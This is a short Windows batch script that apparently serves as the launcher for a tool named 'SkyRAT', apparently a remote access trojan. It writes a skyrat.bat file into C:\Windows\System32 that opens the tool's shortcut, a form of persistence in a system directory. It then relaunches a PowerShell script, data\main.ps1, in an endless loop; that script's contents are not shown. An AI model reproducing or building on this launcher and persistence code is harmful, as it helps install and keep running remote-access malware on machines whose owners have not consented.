@echo off

set /p home=<C:\tmp\skyhome.txt
echo @echo off>C:\Windows\System32\skyrat.bat
echo "%home%\SkyRAT.lnk">>C:\Windows\System32\skyrat.bat

rem Debug
:start
cls
rem Debug

IF NOT EXIST data\main.ps1 cd ..
powershell.exe -c ".\data\main.ps1"


rem Debug
goto start
rem Debug
